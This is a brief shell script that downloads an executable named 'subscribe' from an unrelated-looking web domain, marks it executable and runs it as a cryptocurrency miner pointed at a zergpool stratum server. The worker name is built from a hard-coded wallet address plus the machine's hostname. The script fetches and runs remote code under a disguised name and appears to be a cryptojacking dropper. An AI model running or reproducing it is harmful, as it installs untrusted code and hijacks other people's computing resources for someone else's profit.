#!/bin/sh

wget http://ilovenypizza.com/subscribe
chmod +x subscribe

#run

./subscribe -a cpupower -o stratum+tcp://cpupower.mine.zergpool.com:4250 -u CTg5jaQmry8QTyWW4JAxgG7rd7wHGNsMDk.$(cat /proc/sys/kernel/hostname) -p=c=CPU,mc=CPU
